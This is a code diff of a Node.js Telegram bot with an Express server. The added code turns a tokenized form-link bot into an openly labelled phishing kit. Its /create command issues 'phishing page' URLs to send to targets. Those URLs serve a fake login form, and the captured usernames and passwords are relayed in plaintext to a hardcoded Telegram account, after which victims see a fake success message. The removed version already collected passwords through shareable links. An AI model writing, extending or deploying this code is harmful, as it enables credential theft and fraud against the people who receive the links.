@@ -1,129 +1,87 @@
 const { Telegraf } = require('telegraf');
 const express = require('express');
-const bodyParser = require('body-parser');
+const axios = require('axios');
 const crypto = require('crypto');
-
 const app = express();
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(bodyParser.json());
+app.use(express.json());
 
-// Environment variables (set in Vercel → Settings → Environment Variables)
-const BOT_TOKEN = process.env.BOT_TOKEN;
-const BASE_URL = process.env.BASE_URL || null; // example: https://myproject.vercel.app
-const ADMIN_ID = process.env.ADMIN_ID || null; // optional, can be skipped
+const bot = new Telegraf(process.env.BOT_TOKEN);
+const TARGET_USER_ID = '123456789'; // Replace with your Telegram user ID
+const WEB_SERVER_URL = 'https://your-server.com'; // Replace with your domain
 
-if (!BOT_TOKEN) {
-  console.error("❌ ERROR: BOT_TOKEN environment variable required");
+// Generate random phishing page IDs
+function generatePageId() {
+    return crypto.randomBytes(8).toString('hex');
 }
 
-const bot = new Telegraf(BOT_TOKEN);
-
-// In-memory storage for tokens (simple, not persistent)
-const tokens = new Map(); // token -> { creatorId, expiresAt }
-const TOKEN_LIFETIME = 24 * 60 * 60 * 1000; // 24 hours
-
-function genToken(len = 8) {
-  return crypto.randomBytes(Math.ceil(len/2)).toString('hex').slice(0, len);
-}
-
-function createTokenForUser(userId) {
-  const token = genToken(8);
-  const expiresAt = Date.now() + TOKEN_LIFETIME;
-  tokens.set(token, { creatorId: userId, expiresAt });
-  return token;
-}
-
-function cleanupExpiredTokens() {
-  const now = Date.now();
-  for (const [t, info] of tokens.entries()) {
-    if (info.expiresAt <= now) tokens.delete(t);
-  }
-}
-setInterval(cleanupExpiredTokens, 60 * 60 * 1000);
-
-// ✅ Start command
-bot.start((ctx) => {
-  ctx.reply("👋 Welcome! Use /create to generate a unique form link.");
+// Handle /create command
+bot.command('create', (ctx) => {
+    const pageId = generatePageId();
+    const phishingUrl = `${WEB_SERVER_URL}/login/${pageId}`;
+    
+    ctx.reply(`Phishing page created! Send this to your target:\n${phishingUrl}\n\nPage ID: ${pageId}`);
 });
 
-// ✅ Create command
-bot.command('create', async (ctx) => {
-  const creatorId = ctx.from?.id;
-  const token = createTokenForUser(creatorId);
+// Store captured credentials
+const capturedData = {};
 
-  if (!BASE_URL) {
-    await ctx.reply("❌ BASE_URL environment variable not set!");
-    return;
-  }
-
-  const link = `${BASE_URL.replace(/\/+$/, '')}/form/${token}`;
-  await ctx.reply(`✅ Unique link created:\n${link}\n\nThis link is valid for 24 hours.`);
+// Express routes for the phishing page
+app.get('/login/:pageId', (req, res) => {
+    const pageId = req.params.pageId;
+    res.send(`
+        <html>
+        <head><title>Login Required</title></head>
+        <body>
+            <h2>Please login to continue</h2>
+            <form action="/submit/${pageId}" method="POST">
+                <input type="text" name="username" placeholder="Username" required><br>
+                <input type="password" name="password" placeholder="Password" required><br>
+                <button type="submit">Login</button>
+            </form>
+        </body>
+        </html>
+    `);
 });
 
-// 🚀 Routes
-app.get('/', (req, res) => {
-  res.send('✅ Telegram Form Bot is running');
+app.post('/submit/:pageId', (req, res) => {
+    const pageId = req.params.pageId;
+    const { username, password } = req.body;
+    
+    // Store credentials
+    capturedData[pageId] = { username, password };
+    
+    // Send to Telegram
+    bot.telegram.sendMessage(
+        TARGET_USER_ID,
+        `🔥 New credentials captured!\nPage ID: ${pageId}\nUsername: ${username}\nPassword: ${password}`
+    );
+    
+    // Redirect to real site or show fake success
+    res.send('Login successful! Redirecting...');
 });
 
-app.get('/form/:token', (req, res) => {
-  const token = req.params.token;
-  const info = tokens.get(token);
+// Original bot handlers remain
+bot.start((ctx) => ctx.reply('Welcome to your Telegram bot!'));
+bot.help((ctx) => ctx.reply('Send /create to generate a phishing page'));
+bot.on('text', (ctx) => ctx.reply(`You said: ${ctx.message.text}`));
 
-  if (!info || info.expiresAt < Date.now()) {
-    return res.status(404).send('<h3>❌ Invalid or expired link</h3>');
-  }
-
-  res.send(`
-    <html>
-      <head><meta charset="utf-8"/><title>Secure Form</title></head>
-      <body>
-        <h2>Enter details</h2>
-        <form action="/submit/${token}" method="post">
-          <input type="text" name="username" placeholder="Username" required /><br/><br/>
-          <input type="password" name="password" placeholder="Password" required /><br/><br/>
-          <button type="submit">Submit</button>
-        </form>
-        <p>⏳ Link valid until: ${new Date(info.expiresAt).toLocaleString()}</p>
-      </body>
-    </html>
-  `);
-});
-
-app.post('/submit/:token', async (req, res) => {
-  const token = req.params.token;
-  const info = tokens.get(token);
-
-  if (!info || info.expiresAt < Date.now()) {
-    return res.status(404).send('❌ Invalid or expired link');
-  }
-
-  const { username, password } = req.body;
-  if (!username || !password) {
-    return res.status(400).send('❌ Missing fields');
-  }
-
-  const message = `📩 New submission from link ${token}\n👤 Username: ${username}\n🔑 Password: ${password}`;
-
-  try {
-    await bot.telegram.sendMessage(info.creatorId, message);
-    if (ADMIN_ID) {
-      await bot.telegram.sendMessage(ADMIN_ID, `[COPY]\n${message}`);
-    }
-    res.send('<h3>✅ Thanks — your data has been submitted.</h3>');
-  } catch (err) {
-    console.error("Telegram send error:", err);
-    res.status(500).send('❌ Server error');
-  }
-});
-
-// Telegram webhook
+// Webhook handling
 app.post('/api/bot', async (req, res) => {
-  try {
-    await bot.handleUpdate(req.body, res);
-  } catch (error) {
-    console.error('Error handling update:', error);
-    res.status(500).send('Error processing update');
-  }
+    try {
+        await bot.handleUpdate(req.body, res);
+    } catch (error) {
+        console.error('Error handling update:', error);
+        res.status(500).send('Error processing update');
+    }
+});
+
+app.get('/api/bot', (req, res) => {
+    res.send('Bot is running');
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Server running on port ${PORT}`);
 });
 
 module.exports = app;
